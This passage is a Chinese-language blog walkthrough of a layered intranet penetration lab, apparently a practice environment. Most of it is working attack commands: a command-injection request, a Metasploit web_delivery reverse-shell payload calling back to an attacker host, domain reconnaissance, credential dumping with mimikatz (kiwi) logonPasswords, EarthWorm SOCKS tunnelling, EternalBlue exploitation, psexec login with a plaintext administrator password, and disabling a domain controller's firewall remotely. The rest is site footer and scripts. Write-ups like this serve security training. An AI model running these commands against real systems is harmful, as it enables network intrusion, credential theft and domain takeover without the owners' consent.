class="hljs-string">&quot;/general/../../attach/im/2407/1005700217.jpg&quot;</span>&#125;&amp;<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">whoami</span></span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/domain13.png" srcset="/img/loading.gif" lazyload alt="domain3"></p>
+<p>然后尝试上线msf</p>
+<p><img src="/img/domain14.png" srcset="/img/loading.gif" lazyload alt="domain3"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">use exploit/multi/script/web_delivery<br>set target 2<br>set payload windows/meterpreter/reverse_tcp<br>set lhost 192.168.40.136<br>set lport 5566<br>run<br></code></pre></td></tr></table></figure>
+
+<p>生成的代码直接拿去Burpsuite执行，成功上线msf，从而对目标内网进行信息搜集</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">ipconfig /all   <span class="hljs-comment"># 查看本机ip，所在域</span><br>systeminfo      <span class="hljs-comment"># 列出系统信息</span><br>route <span class="hljs-built_in">print</span>     <span class="hljs-comment"># 打印路由信息</span><br>net view        <span class="hljs-comment"># 查看局域网内其他主机名</span><br>arp -a          <span class="hljs-comment"># 查看arp缓存</span><br><span class="hljs-built_in">whoami</span><br>net start       <span class="hljs-comment"># 查看开启了哪些服务</span><br>net share       <span class="hljs-comment"># 查看开启了哪些共享</span><br><br>net config workstation   <span class="hljs-comment"># 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br>net user                 <span class="hljs-comment"># 查看本机用户列表</span><br>net user /domain         <span class="hljs-comment"># 查看域用户</span><br>net localgroup administrators   <span class="hljs-comment"># 查看本地管理员组（通常会有域用户）</span><br>net view /domain         <span class="hljs-comment"># 查看有几个域</span><br>net user 用户名 /domain   <span class="hljs-comment"># 获取指定域用户的信息</span><br>net group /domain        <span class="hljs-comment"># 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br>net group 组名 /domain    <span class="hljs-comment"># 查看域中某工作组</span><br>net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain  <span class="hljs-comment"># 查看域管理员的名字</span><br>net group <span class="hljs-string">&quot;domain computers&quot;</span> /domain  <span class="hljs-comment"># 查看域中的其他主机名</span><br>net group <span class="hljs-string">&quot;domain controllers&quot;</span> /domain  <span class="hljs-comment"># 查看域控制器（可能有多台）</span><br></code></pre></td></tr></table></figure>
+
+<p>使用meterpreter上的kiwi模块成功抓取到域用户bunny和域管理员administrator的凭证</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">load kiwi<br>kiwi_cmd privilege::debug<br>kiwi_cmd sekurlsa::logonPasswords<br></code></pre></td></tr></table></figure>
+
+<p><strong>注意！如果提示需要运行在x64的进程中，可以使用ps查看进程，然后使用migrate迁移进程</strong></p>
+<p><img src="/img/domain15.png" srcset="/img/loading.gif" lazyload alt="domain3"></p>
+<h2 id="第三层网络渗透"><a href="#第三层网络渗透" class="headerlink" title="第三层网络渗透"></a>第三层网络渗透</h2><p>使用<strong>earthworm</strong>搭建一个二级socks5代理服务</p>
+<p>首先攻击机上执行如下命令添加一个转接隧道，监听1090端口，并将1090端口收到的代理请求发送给1235端口</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">./ew_for_linux64</span> <span class="hljs-string">-s</span> <span class="hljs-string">lcx_listen</span> <span class="hljs-string">-l</span> <span class="hljs-number">1090</span> <span class="hljs-string">-e</span> <span class="hljs-number">1235</span><br></code></pre></td></tr></table></figure>
+
+<p>然后在第二层网络的Windows服务器上传ew_for_Win.exe，并利用ssocksd方式启动999端口的正向socks代理</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew_for_Win</span>.exe -s ssocksd -l <span class="hljs-number">999</span><br></code></pre></td></tr></table></figure>
+
+<p>最后，在DMZ区域的Ubuntu 18上传ew_for_linux64并利用lcx_slave方式，将攻击机的1235端口与第二层网络Windows 7的999端口连接起来</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">./ew_for_linux64 -s lcx_slave -d <span class="hljs-number">192.168.1.7</span> -e <span class="hljs-number">1235</span> -f <span class="hljs-number">192.168.52.30</span> -g <span class="hljs-number">999</span><br></code></pre></td></tr></table></figure>
+
+<p>然后配置**&#x2F;etc&#x2F;proxychains.conf**</p>
+<p>使用nmap此93网段进行扫描，发现存在192.168.93.30和192.168.93.40这两台机器，且其445端口都开放，猜测有可能存在永恒之蓝</p>
+<p><img src="/img/domain16.png" srcset="/img/loading.gif" lazyload alt="domain3"></p>
+<p><img src="/img/domain17.png" srcset="/img/loading.gif" lazyload alt="domain3"></p>
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>对192.168.93.40进行单独扫描，发现其为Windows7且139、135、445端口均开放</p>
+<p>尝试使用msf打永恒之蓝</p>
+<p><strong>注意！直接在msf通过setg Proxies设置全局代理未能成功，而最终通过proxychains来运行msfconsole攻击成功</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp <br><span class="hljs-built_in">set</span> rhosts 192.168.93.40<br>run<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/domain18.png" srcset="/img/loading.gif" lazyload alt="domain3"></p>
+<p>成功拿下</p>
+<h2 id="域控渗透"><a href="#域控渗透" class="headerlink" title="域控渗透"></a>域控渗透</h2><p>使用psexec模块进行对域控的渗透攻击</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/windows/smb/psexec<br><span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">192.168.93.30</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 9999</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SMBUser administrator</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SMBPass Whoami2021</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">payload windows</span>/meterpreter/<span class="hljs-comment">bind_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhost 192.168.93.30</span><br>run<br></code></pre></td></tr></table></figure>
+
+<p>攻击失败，猜测是防火墙的问题</p>
+<p>重新连接进192.168.52.30的shell，通过其输入用户名和密码来关掉192.168.93.30域控的防火墙</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.93.30</span>\ipc$ <span class="hljs-string">&quot;Whoami2021&quot;</span> /user:<span class="hljs-string">&quot;Administrator&quot;</span><br>sc \\<span class="hljs-number">192.168.93.30</span> create unablefirewall binpath= <span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br>sc \\<span class="hljs-number">192.168.93.30</span> start unablefirewall<br></code></pre></td></tr></table></figure>
+
+<p><strong>注意！虽然命令执行后会报Failed，但实际防火墙已经关闭了</strong></p>
+<p>再次执行上面的命令，成功拿下了域控</p>
+<p><img src="/img/domain19.png" srcset="/img/loading.gif" lazyload alt="domain3"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="print-no-link">#内网渗透</a>
+      
+        <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="print-no-link">#信息收集</a>
+      
+        <a href="/tags/%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4/" class="print-no-link">#相关指令</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>不同环境下内网渗透的相关技巧</div>
+      <div>http://example.com/2024/06/17/domain1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>ZERO</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年6月17日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/06/17/command1/" title="不同环境下内网渗透的相关技巧">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">不同环境下内网渗透的相关技巧</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/06/15/zuoye/" title="记录一次简单的渗透测试的练习">
+                        <span class="hidden-mobile">记录一次简单的渗透测试的练习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
